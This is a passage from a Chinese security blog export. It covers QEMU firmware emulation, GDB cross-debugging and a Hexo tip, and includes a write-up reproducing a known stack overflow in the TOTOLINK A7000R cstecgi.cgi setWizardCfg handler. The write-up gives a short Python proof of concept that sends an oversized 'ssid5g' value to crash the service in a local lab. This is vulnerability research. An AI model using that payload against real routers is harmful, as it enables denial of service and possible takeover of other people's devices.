<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo qemu-system-aarch64 \</span><br><span class="line">-machine &#x27;virt&#x27; \</span><br><span class="line">-cpu &#x27;cortex-a57&#x27; \</span><br><span class="line">-m 1G \</span><br><span class="line">-device virtio-blk-device,drive=hd \</span><br><span class="line">-drive file=image.qcow2,if=none,id=hd \</span><br><span class="line">-netdev tap,id=tapnet,ifname=tap0,script=no \</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">配置一个主机侧的TAP网络设备，命名为tapnet，使用主机的tap0网卡</span></span><br><span class="line">-device virtio-net-device,netdev=tapnet -netdev user,id=net,hostfwd=tcp::2222-:22 \</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">虚拟机使用虚拟网卡，对应设备为前面创建的tapnet设备</span></span><br><span class="line">-kernel kernel \</span><br><span class="line">-initrd initrd \</span><br><span class="line">-nographic \</span><br><span class="line">-append &quot;root=LABEL=rootfs console=ttyAMA0&quot;</span><br></pre></td></tr></table></figure>

<p>此时登入shell，检查虚拟机的网络配置，这里我的虚拟机没有ifconfig命令，因此选择使用ip命令（不得不感慨chatgpt的强大与方便~~~）</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@debian:/# ip link show</span><br><span class="line">1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN mode DEFAULT group default qlen 1000</span><br><span class="line">    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00</span><br><span class="line">2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc fq_codel state UP mode DEFAULT group default qlen 1000</span><br><span class="line">    link/ether 52:54:00:12:34:56 brd ff:ff:ff:ff:ff:ff</span><br></pre></td></tr></table></figure>

<p>发现已有eth0网卡，那么就要将其ip设置为与宿主机同一网段（192.168.1.0&#x2F;24）。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">设置ip地址</span></span><br><span class="line">ip addr add 192.168.1.2/24 dev eth0</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">设置网关</span></span><br><span class="line">ip route add default via 192.168.1.1</span><br></pre></td></tr></table></figure>

<p>设置好后发现互相ping不通，显示目标不可达，查看ip route发现路径不对：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@debian:/# ip route</span><br><span class="line">default via 10.0.2.2 dev eth0 onlink</span><br><span class="line">10.0.2.0/24 dev eth0 proto kernel scope link src 10.0.2.15</span><br><span class="line">172.17.176.0/20 dev eth0 proto kernel scope link src 172.17.178.111</span><br><span class="line">172.17.178.0/24 dev eth0 proto kernel scope link src 172.17.178.111</span><br><span class="line">192.168.1.0/24 dev eth0 proto kernel scope link src 192.168.1.2</span><br></pre></td></tr></table></figure>

<p>因此更换default为192.168.1.0&#x2F;24，同时删除其他错误项：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">    ip route del default</span><br><span class="line">ip route del 172.17.176.0/20</span><br><span class="line">...</span><br><span class="line">ip route add 192.168.1.0/24 dev eth0</span><br><span class="line">ip route add default via 192.168.1.1 dev eth0</span><br></pre></td></tr></table></figure>

<p><code>ip address show</code>也显示有问题，使用<code>ip addr del</code>删去无关项即可</p>
<p>Tips：这里我用的是WSL，发现linux虚拟机无法ping通Windows主机，是Windows主机的防火墙拦截掉了。使用powershell管理员用户输入以下命令即可。</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">New-NetFirewallRule</span> <span class="literal">-DisplayName</span> <span class="string">&quot;WSL&quot;</span> <span class="literal">-Direction</span> Inbound  <span class="literal">-InterfaceAlias</span> <span class="string">&quot;vEthernet (WSL)&quot;</span>  <span class="literal">-Action</span> Allow</span><br></pre></td></tr></table></figure>

<h4 id="SSH连接QEMU虚拟机"><a href="#SSH连接QEMU虚拟机" class="headerlink" title="SSH连接QEMU虚拟机"></a>SSH连接QEMU虚拟机</h4><p>只能进行shell连接是不够的，添加ssh连接，方便后续上传固件以及gdbserver等内容</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ssh root@192.168.1.2</span><br></pre></td></tr></table></figure>

<h4 id="上传并执行固件"><a href="#上传并执行固件" class="headerlink" title="上传并执行固件"></a>上传并执行固件</h4><p>系统已经成功模拟，接下来我们要让其能够模拟执行固件。</p>
<p>使用scp命令上传固件</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">scp -r ./squashfs-root root@192.168.1.2:/root/</span><br></pre></td></tr></table></figure>

<p>回到qemu命令行，使用chroot更改根目录为固件的根目录并且启动web服务<code>/usr/sbin/shttpd</code>，不过这里发现访问页面404。发现是执行路径的原因</p>
<p>在<code>/web</code>路径下执行<code>/usr/sbin/shttpd</code>解决该问题</p>
<h4 id="WSL-GUI问题解决"><a href="#WSL-GUI问题解决" class="headerlink" title="WSL GUI问题解决"></a>WSL GUI问题解决</h4><p>成功模拟固件后，还需要能够通过浏览器页面访问呀，因此这里再浅谈一下如何使用WSL2开启GUI的浏览器访问固件页面。</p>
<p>参考链接：<a href="https://learn.microsoft.com/zh-cn/windows/wsl/tutorials/gui-apps">在适用于 Linux 的 Windows 子系统上运行 Linux GUI 应用</a></p>
<p>这里仅介绍chrome浏览器的安装</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">将目录更改为 temp 文件夹：</span></span><br><span class="line">cd /tmp</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">使用 wget 下载：</span></span><br><span class="line">wget https://dl.google.com/linux/direct/google-chrome-stable_current_amd64.deb</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">安装：</span></span><br><span class="line">sudo apt install --fix-missing ./google-chrome-stable_current_amd64.deb</span><br></pre></td></tr></table></figure>

<p>然后使用<code>google-chrome</code>命令即可，打开后成功访问固件模拟主页</p>
<img src="/posts/d96204a2/image-20241103210850411.png" class="" title="image-20241103210850411">

]]></content>
      <categories>
        <category>漏洞分析</category>
      </categories>
      <tags>
        <tag>固件模拟</tag>
        <tag>QEMU</tag>
      </tags>
  </entry>
  <entry>
    <title>Hexo隐藏指定文章</title>
    <url>/posts/9c83ed78.html</url>
    <content><![CDATA[<p> 有撰写博客时，有一些文章尚在撰写或者仅用于个人记录，需要进行隐藏，本文进行此功能的设置：</p>
<h2 id="使用插件"><a href="#使用插件" class="headerlink" title="使用插件"></a>使用插件</h2><p>插件：<a href="https://github.com/prinsss/hexo-hide-posts">hexo-hide-posts</a></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">npm install hexo-hide-posts</span><br></pre></td></tr></table></figure>

<h2 id="Config-yml配置"><a href="#Config-yml配置" class="headerlink" title="Config.yml配置"></a>Config.yml配置</h2><p>在<code>_config.yml</code>中添加以下内容：</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">hide_posts:</span></span><br><span class="line">  <span class="comment"># Should hexo-hide-posts be enabled.</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># The front-matter key for flagging hidden posts.</span></span><br><span class="line">  <span class="comment"># You can change the filter name if you like.</span></span><br><span class="line">  <span class="attr">filter:</span> <span class="string">hidden</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># Add &quot;noindex&quot; meta tag to prevent hidden posts from being indexed by search engines.</span></span><br><span class="line">  <span class="attr">noindex:</span> <span class="literal">true</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># Generators in the allowlist will have access to the hidden posts.</span></span><br><span class="line">  <span class="comment"># Common generators in Hexo: &#x27;index&#x27;, &#x27;tag&#x27;, &#x27;category&#x27;, &#x27;archive&#x27;, &#x27;sitemap&#x27;, &#x27;feed&#x27;</span></span><br><span class="line">  <span class="comment"># allowlist_generators: []</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># Generators in the blocklist can *not* access the hidden posts.</span></span><br><span class="line">  <span class="comment"># The allowlist has higher priority than the blocklist, if both set.</span></span><br><span class="line">  <span class="comment"># blocklist_generators: [&#x27;*&#x27;]</span></span><br></pre></td></tr></table></figure>

<h2 id="文章Front-Matter设置"><a href="#文章Front-Matter设置" class="headerlink" title="文章Front-Matter设置"></a>文章Front-Matter设置</h2><p>如果想要将文章隐藏掉，只需要在Front-Matter中添加<code>hidder: true</code>即可，如下图：</p>
<img src="/posts/9c83ed78/image-20241105170804534.png" class="" title="image-20241105170804534">

<p>这样就可以将目标文章隐藏掉了，主页，归档，标签都不会出现相关信息。不过需要注意<strong>直接用url还是可以访问</strong>的。</p>
<p>（这个不建议搭配abbrlink，可能会被爆破的，不过应该没人这么无聊吧哈哈哈~</p>
]]></content>
      <tags>
        <tag>教程</tag>
        <tag>Hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>Qemu+Gdb使用</title>
    <url>/posts/4533a54e.html</url>
    <content><![CDATA[<p>测试固件栈溢出漏洞时，需要使用gdb来进行调试。因此记录下gdb如何使用</p>
<p>注意：只成功了QEMU系统模式+GDB本地调试，其他几个方法欢迎各位师傅给予指导，万分感谢！</p>
<h2 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h2><p>安装<code>gdb-multiarch</code>支持不同架构的程序调试</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt install gdb-multiarch</span><br></pre></td></tr></table></figure>



<h2 id="QEMU用户模式-GDB-Remote"><a href="#QEMU用户模式-GDB-Remote" class="headerlink" title="QEMU用户模式+GDB Remote"></a>QEMU用户模式+GDB Remote</h2><blockquote>
<p>最好用且方便的调试方法</p>
</blockquote>
<p>使用qemu调试执行挂起</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo chroot ./ ./qemu-aarch-static -g ./usr/sbin/shttpd</span><br></pre></td></tr></table></figure>

<p>gdb连接调试</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gdb-multiarch -q ./usr/sbin/shttpd</span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash"><span class="built_in">set</span> architecture aarch64</span></span><br><span class="line">The target architecture is set to &quot;aarch64&quot;.</span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">target remote 127.0.0.1:1234</span></span><br><span class="line">Remote debugging using 127.0.0.1:1234</span><br></pre></td></tr></table></figure>

<h2 id="QEMU用户模式-GDB-Attach"><a href="#QEMU用户模式-GDB-Attach" class="headerlink" title="QEMU用户模式+GDB Attach"></a>QEMU用户模式+GDB Attach</h2><p>使用qemu用户模式启动目标程序，并使用gdb attach对应程序的pid即可</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">开启目标程序</span></span><br><span class="line">sudo chroot . ./qemu-aarch64-static ./usr/sbin/shttpd</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查找对应的程序pid</span></span><br><span class="line">sudo netstat -antp | grep 80</span><br><span class="line">tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      7268/./qemu-aarch64</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">gdb attach 对应程序pid</span></span><br><span class="line">gdb-multiarch attach 7268</span><br></pre></td></tr></table></figure>

<p>注意此种方法shttpd程序加载基址，使用<code>vmmap</code>查看发现是attach到了qemu-aarch64-static程序上，感觉没什么用。。。（因为没办法下断点）</p>
<h2 id="QEMU-GDB本地调试"><a href="#QEMU-GDB本地调试" class="headerlink" title="QEMU GDB本地调试"></a>QEMU GDB本地调试</h2><h3 id="下载gdb源码"><a href="#下载gdb源码" class="headerlink" title="下载gdb源码"></a>下载gdb源码</h3><p>下载gdb源码并且以aarch64架构编译。然后上传到虚拟机上调试</p>
<p><a href="https://sourceware.org/gdb/download/">gdb源码下载链接</a></p>
<p>下载好后解压，这里我选择gdb7.11，交叉编译选择g++-9-aarch64-linux-gnu，注意版本，不同版本可能编译失败</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">tar -xf gdb-7.11.tar.xz</span><br></pre></td></tr></table></figure>

<h3 id="安装交叉编译工具"><a href="#安装交叉编译工具" class="headerlink" title="安装交叉编译工具"></a>安装交叉编译工具</h3><p>查找aarch64相关工具，发现有很多版本的交叉编译工具</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt-cache search aarch64</span><br></pre></td></tr></table></figure>

<img src="/posts/4533a54e/image-20241104104428243.png" class="" title="image-20241104104428243">

<p><a href="https://blog.csdn.net/yangxueyangxue/article/details/95586868">gcc与g++的区别</a></p>
<p>选择g++工具安装</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt-get install g++-9-aarch64-linux-gnu</span><br></pre></td></tr></table></figure>

<p>安装好后查看g++版本:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">aarch64-linux-gnu-g++-9 -v</span><br></pre></td></tr></table></figure>

<img src="/posts/4533a54e/image-20241104111823060.png" class="" title="image-20241104111823060">

<p>进入gdb-7.11目录，配置编译选项</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mkdir build</span><br><span class="line">cd build</span><br><span class="line">../configure --host=aarch64-linux-gnu</span><br></pre></td></tr></table></figure>

<p>配置无误后，编译即可</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">make -j8</span><br></pre></td></tr></table></figure>

<h3 id="编译问题解决"><a href="#编译问题解决" class="headerlink" title="编译问题解决"></a>编译问题解决</h3><p>尝试了好几个gdb版本编译，结果都报这两个错误，因此对源码进行修改。</p>
<img src="/posts/4533a54e/image-20241104112109625.png" class="" title="image-20241104112109625">

<ol>
<li><p><strong>error: unknown type name ‘gdb_fpregset_t’</strong></p>
<p>在<code>./gdb/gdb_proc_service.h</code>添加<code>#include &quot;gregset.h&quot;</code>头文件</p>
<img src="/posts/4533a54e/image-20241104112351374.png" class="" title="image-20241104112351374">
</li>
<li><p><strong>error: conflicting types for ‘ps_get_thread_area’;</strong></p>
</li>
</ol>
<p>   把重定义的文件打开，把重定义的部分注释掉就可以了。</p>
<p>   修改<code>./gdb/aarch64-linux-nat.c</code>，<code>./gdb/gdb_proc_service.h</code>，<code>./gdb/nat/aarch64-linux.h</code></p>
<ol start="3">
<li><p><strong>error: ‘elf_fpregset_t’ {aka ‘struct user_fpregs_struct’} has no member named ‘vregs’</strong></p>
<p><a href="https://stackoverflow.com/questions/75670160/occur-struct-redefined-while-cross-compiled-gdb-8-2">参考链接</a></p>
<p>是交叉编译是CC被configure默认配置为了g++，是x86_64架构的，因此使用以下命令修改：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">CC=aarch64-linux-gnu-gcc-9 \</span><br><span class="line">CXX=aarch64-linux-gnu-g++-9 \</span><br><span class="line">../configure \</span><br><span class="line">--host=&#x27;aarch64-linux-gnu&#x27;</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>error: expected identifier before numeric constant  # define TRAP_HWBKPT 4</strong></p>
<p><a href="https://github.com/foss-for-synopsys-dwc-arc-processors/binutils-gdb/commit/e6600bbefd667810744fbe8eed3830bf5644c354">参考链接</a></p>
<p>按照链接内容修改即可</p>
</li>
</ol>
<h3 id="上传gdb到QEMU虚拟机"><a href="#上传gdb到QEMU虚拟机" class="headerlink" title="上传gdb到QEMU虚拟机"></a>上传gdb到QEMU虚拟机</h3><p>编译成功后将gdb通过scp工具上传到QEMU虚拟机上</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">scp ./gdb/gdb root@192.168.1.2:/root/ </span><br></pre></td></tr></table></figure>

<p>成功执行，接下来只需要在虚拟机里调试即可</p>
<img src="/posts/4533a54e/image-20241104115517067.png" class="" title="image-20241104115517067">

<p>当然，如果你是在虚拟机中使用chroot . &#x2F;bin&#x2F;sh模拟固件，那么你需要将gdb复制到对应根目录下，同时注意将gdb依赖的库文件也复制过去</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ldd ./gdb</span><br><span class="line">    linux-vdso.so.1 (0x0000ffff8fab7000)</span><br><span class="line">    libm.so.6 =&gt; /lib/aarch64-linux-gnu/libm.so.6 (0x0000ffff8f350000)</span><br><span class="line">    libc.so.6 =&gt; /lib/aarch64-linux-gnu/libc.so.6 (0x0000ffff8f1a0000)</span><br><span class="line">    /lib/ld-linux-aarch64.so.1 (0x0000ffff8fa7a000)</span><br><span class="line">cp /lib/ld-linux-aarch64.so.1 ./lib/</span><br><span class="line">mkdir ./lib/aarch64-linux-gnu</span><br><span class="line">cp /lib/aarch64-linux-gnu/libm.so.6 /lib/aarch64-linux-gnu/libm.so.6</span><br><span class="line">cp /lib/aarch64-linux-gnu/libc.so.6 /lib/aarch64-linux-gnu/libc.so.6</span><br></pre></td></tr></table></figure>

<h2 id="QEMU-gdbserver"><a href="#QEMU-gdbserver" class="headerlink" title="QEMU gdbserver"></a>QEMU gdbserver</h2><p>一般情况下qemu都会内置gdbserver模块，基于此可以实现对qemu虚拟机的远程调试。</p>
<p>在qemu启动时添加<code>-S -s</code>参数，-S参数表示qemu不要启动程序，处于阻塞状态，等待gdb指令。-s参数表示启动gdb-server监听在TCP端口1234上。</p>
<p>（待完善）</p>
]]></content>
      <categories>
        <category>漏洞分析</category>
      </categories>
      <tags>
        <tag>QEMU</tag>
      </tags>
  </entry>
  <entry>
    <title>TOTOLINK A7000R路由器固件调试</title>
    <url>/posts/604570cd.html</url>
    <content><![CDATA[<p>近期在尝试挖路由器设备的漏洞，选中了Totolink这一比较好挖洞的牌子，有一些已知漏洞想要复现一下，需要使用gdb进行调试，因此在此记录下具体过程。</p>
<p>参考链接：</p>
<ul>
<li><a href="https://www.iotsec-zone.com/article/319">浅析cgi与lighttpd之间的调用过程</a></li>
<li><a href="https://feng-zz-pwn.github.io/2024/03/16/iot-lighttpd/">IOT_Lighttpd</a></li>
</ul>
<h2 id="模拟执行目标固件"><a href="#模拟执行目标固件" class="headerlink" title="模拟执行目标固件"></a>模拟执行目标固件</h2><p>固件为MIPS架构，可以直接使用binwalk提取出文件系统。</p>
<p>本次选择的目标为A7000R型号其中的<code>/cgi-bin/cstecgi.cgi</code>文件。</p>
<p>使用qemu用户模式执行<code>/usr/sbin/lighttpd</code>（lighttpd与cgi文件的关系可看上面给的参考链接）</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cp xx/qemu-mipsel-static ./</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">切换根目录到squash-root文件系统</span></span><br><span class="line">sudo chroot ./ /bin/sh</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">注：需要在www目录下执行lighttpd才能够正常运行</span></span><br><span class="line">cd www</span><br><span class="line">../qemu-mipsel-static -g 1234 ../usr/sbin/lighttpd -f ../lighttp/lighttpd.conf</span><br></pre></td></tr></table></figure>

<p>然后在宿主机执行gdb进行调试</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gdb-multiarch ./usr/sbin/lighttpd</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash"><span class="built_in">set</span> architecture mips</span></span><br><span class="line">The target architecture is set to &quot;mips&quot;.</span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">target remote 127.0.0.1:1234</span></span><br><span class="line">Remote debugging using 127.0.0.1:1234</span><br></pre></td></tr></table></figure>

<p>然后就可以进入调试界面了</p>
<h2 id="gdb配置"><a href="#gdb配置" class="headerlink" title="gdb配置"></a>gdb配置</h2><p>需要注意的是，漏洞存在于<code>/cgi-bin/cstecgi.cgi</code>文件中，该文件由<code>lighttpd</code>使用fork子进程的方式完成调用。因此还需要在gdb中进行额外的设置来调试<code>cstecgi.cgi</code>文件的漏洞。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">set follow-fork-mode child</span><br><span class="line">set detach-on-fork off</span><br></pre></td></tr></table></figure>

<p>首先在<code>lighttpd</code>的main函数下断点。确保调试正常</p>
<p>然后寻找fork函数调用点，极有可能为cgi的启动函数，下图为在proc_open中找到的fork+execve函数，猜测可能是cgi-bin的启动函数</p>
<img src="/posts/604570cd/image-20241107123818780.png" class="" title="image-20241107123818780">

<p>在execl函数处下断点，向<code>lighttpd</code>程序发送poc请求包，发现在令lighttpd继续执行后，其会直接退出，因此考虑其他方法</p>
<h2 id="gdb-attach-进程"><a href="#gdb-attach-进程" class="headerlink" title="gdb attach 进程"></a>gdb attach 进程</h2><p>lighttpd虽然退出，但是还存在进程在监听80端口，同时web服务正常，因此考虑attach对应进程</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo netstat -antp | grep 80</span><br><span class="line">tcp        0      0 127.0.0.1:5432          0.0.0.0:*               LISTEN      380/postgres</span><br><span class="line">tcp        0      0 0.0.0.0:8080            0.0.0.0:*               LISTEN      26475/../qemu-mipse</span><br><span class="line">tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      26475/../qemu-mipse</span><br><span class="line">tcp        0      0 172.17.178.131:50808    101.33.241.59:4443      ESTABLISHED 369/cpolar: worker</span><br></pre></td></tr></table></figure>

<p>但是和之前一样，attach的是qemu进程，并不是lighttpd</p>
<h2 id="直接调试cgi"><a href="#直接调试cgi" class="headerlink" title="直接调试cgi"></a>直接调试cgi</h2><h3 id="cgi程序运行"><a href="#cgi程序运行" class="headerlink" title="cgi程序运行"></a>cgi程序运行</h3><p>根据参考链接可以知道，如果为cgi文件提供正确的环境变量，也是可以直接运行cgi文件的。</p>
<p>如下图，直接运行cgi文件会报错：</p>
<img src="/posts/604570cd/image-20241107130621007.png" class="" title="image-20241107130621007">

<p>因此考虑为cgi提供合适的环境变量，来模拟运行，通过逆向cgi的main函数处理逻辑，得到以下环境变量</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">export QUERY_STRING=http://127.0.0.1/index.html	# 请求url，可以触发loginAuth，Upload处理逻辑</span><br><span class="line">export CONTENT_LENGTH=3000</span><br><span class="line">export stationIp=&quot;127.0.0.1&quot;</span><br><span class="line">export REMOTE_ADDR=&quot;127.0.0.1&quot;</span><br><span class="line">export http_host=&quot;a&quot;		# 请求参数</span><br><span class="line">export UPLOAD_FILENAME=&quot;filename&quot;	# 请求参数</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>添加以上环境变量后，发现不再报错：</p>
<img src="/posts/604570cd/image-20241107131013990.png" class="" title="image-20241107131013990">

<p>使用gdb-multiarch调试，成功断在main函数位置</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gdb-multiarch ./www/cgi-bin/cstecgi.cgi</span><br><span class="line"></span><br><span class="line">pwndbg&gt; set architecture mips</span><br><span class="line">The target architecture is set to &quot;mips&quot;.</span><br><span class="line">pwndbg&gt; target 127.0.0.1:1234</span><br><span class="line">Undefined target command: &quot;127.0.0.1:1234&quot;.  Try &quot;help target&quot;.</span><br><span class="line">pwndbg&gt; target remote 127.0.0.1:1234</span><br><span class="line">Remote debugging using 127.0.0.1:1234</span><br></pre></td></tr></table></figure>

<img src="/posts/604570cd/image-20241107131405460.png" class="" title="image-20241107131405460">

<p>继续逆向会发现cgi程序接受参数输入的方法有两种：</p>
<ul>
<li><p>环境变量<code>getenv</code>：从<code>lighttpd</code>程序设置好的环境变量中提取参数值</p>
</li>
<li><p>标准输入<code>fread</code>：从标准输入获取json变量内容，适用于<code>WebGetsVar()</code>函数。如下图所示，v11为标准输入获取的值</p>
<img src="/posts/604570cd/image-20241107131849362.png" class="" title="image-20241107131849362"></li>
</ul>
<h3 id="cgi程序分析"><a href="#cgi程序分析" class="headerlink" title="cgi程序分析"></a>cgi程序分析</h3><p>此处再简要概括下cgi文件main函数的主要逻辑：</p>
<ol>
<li><p>首先获取环境变量，分配<code>CONTENT_LENGTH</code>大小空间存储输入的JSON数据，然后判断QUERY_STRING值是否存在”action&#x3D;login”和”action&#x3D;upload”字符串，有则继续，没有则转入3</p>
</li>
<li><p>如果存在”action&#x3D;login”，则设置为<code>topicurl</code>为”loginAuth”，并构造请求包</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;topicurl&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;loginAuth&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;loginAuthUrl&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&#123;arg1&#125;&amp;http_host=&#123;arg2&#125;&amp;flag=ie8&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>如果存在”action&#x3D;upload”，则继续获取环境变量UPLOAD_FILENAME，设置<code>topicurl</code>为QUERY_STRING第一个参数，并设置FileName等参数变量</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">	<span class="attr">&quot;topicurl&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;&#123;arg1&#125;&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;FileName&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;&#123;arg2&#125;&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;ContentLength&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/tmp/linux.trx&quot;</span><span class="punctuation">,</span></span><br><span class="line">    ...</span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>获取标准输入解析出”topicurl”值，并根据”set”, “get”, “del”分类跳转到不同的handler列表，执行对应的回调函数。</p>
</li>
</ol>
<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>我们要测试的漏洞位于<code>setWizardCfg</code>函数，因此只需要构造以下环境变量：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">export CONTENT_LENGTH=52</span><br></pre></td></tr></table></figure>

<p>继续执行到fread函数，读取输入为请求参数：</p>
<img src="/posts/604570cd/image-20241107133709164.png" class="" title="image-20241107133709164">

<p>输入以下payload：</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;topicurl&quot;</span><span class="punctuation">:</span><span class="string">&quot;setWizardCfg&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;ssid5g&quot;</span><span class="punctuation">:</span><span class="string">&quot;aaaaaaaaaa&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>注意CONTENT_LENGTH与payload长度要对应：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">data = &#123;<span class="string">&quot;topicurl&quot;</span>:<span class="string">&quot;setWizardCfg&quot;</span>, <span class="string">&quot;ssid5g&quot;</span>:<span class="string">&quot;aaaaaaaaaa&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;./payload&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    json.dump(data, f)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;[+] write <span class="subst">&#123;<span class="built_in">len</span>(data)&#125;</span> chars to payload&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>读入后，我们在setWizardCfg函数设置断点，查看是否正常调用该函数：</p>
<img src="/posts/604570cd/image-20241107134757955.png" class="" title="image-20241107134757955">

<p>成功断在该位置。且成功读取了我们设置的”ssid5g”参数。</p>
<img src="/posts/604570cd/image-20241107135015692.png" class="" title="image-20241107135015692">

<p>然后我们就可以进行调试了，通过构造长度足够大的”ssid5g”参数，造成缓冲区溢出：</p>
<p>poc.py</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># export CONTENT_LENGTH=4138</span></span><br><span class="line"><span class="comment"># !/bin/sh</span></span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">data = &#123;<span class="string">&quot;topicurl&quot;</span>:<span class="string">&quot;setWizardCfg&quot;</span>, <span class="string">&quot;ssid5g&quot;</span>:<span class="string">&quot;a&quot;</span>*<span class="number">0x1000</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;./payload&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    json.dump(data, f)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;[+] write <span class="subst">&#123;<span class="built_in">len</span>(<span class="built_in">str</span>(data))&#125;</span> chars to payload&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>执行后断在sink函数，发现成功覆盖fp, sp寄存器后</p>
<img src="/posts/604570cd/image-20241107135359468.png" class="" title="image-20241107135359468">

<p>输入过长payload造成栈溢出</p>
<img src="/posts/604570cd/image-20241107142300722.png" class="" title="image-20241107142300722">
]]></content>
      <categories>
        <category>漏洞分析</category>
      </categories>
      <tags>
        <tag>固件</tag>
      </tags>
  </entry>
  <entry>
    <title>WSL2安装Ghidra</title>
    <url>/posts/c9ea9d94.html</url>
    <content><![CDATA[<p>慢慢的从双系统迁移到WSL，这次试着在WSL2上安装Ghidra工具。</p>
<p>参考链接：</p>
<ul>
<li><a href="https://qiita.com/motimotipurinn/items/4ed66dce780a886d2f32">WSLでGhidra環境構築</a></li>
</ul>
